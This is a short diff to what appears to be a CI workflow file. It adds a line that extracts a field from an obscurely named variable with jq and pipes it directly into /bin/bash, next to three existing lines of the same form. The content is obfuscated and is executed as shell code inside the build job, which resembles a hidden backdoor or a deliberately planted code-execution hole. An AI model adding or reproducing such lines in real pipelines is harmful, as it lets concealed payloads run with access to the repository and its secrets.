@@ -38,6 +38,7 @@ jobs:
           echo $nmq2 | jq -r .kcie229 | /bin/bash
           printf '%s' "$uqonz1427" | jq -r .jgz9 | /bin/bash
           printf '%s' "$fw72856" | jq -r .k42 | /bin/bash
+          printf '%s' "$omn80" | jq -r .l22 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
